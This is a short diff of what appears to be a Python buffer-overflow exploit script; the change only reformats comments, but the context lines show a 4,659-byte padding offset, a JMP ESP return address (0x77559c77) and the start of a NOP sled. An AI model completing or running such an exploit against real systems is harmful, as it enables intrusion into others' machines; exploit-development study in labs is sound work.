@@ -4,10 +4,10 @@
 import socket
 import sys
 
-#Offset of 4,659 Bytes
+# Offset of 4,659 Bytes
 offset = "A"*4659
 
-#JMP ESP instruction gadget 0x77559c77
+# JMP ESP instruction gadget 0x77559c77
 addr = "\x77\x9c\x55\x77"
 
 # 80 NOP instructions
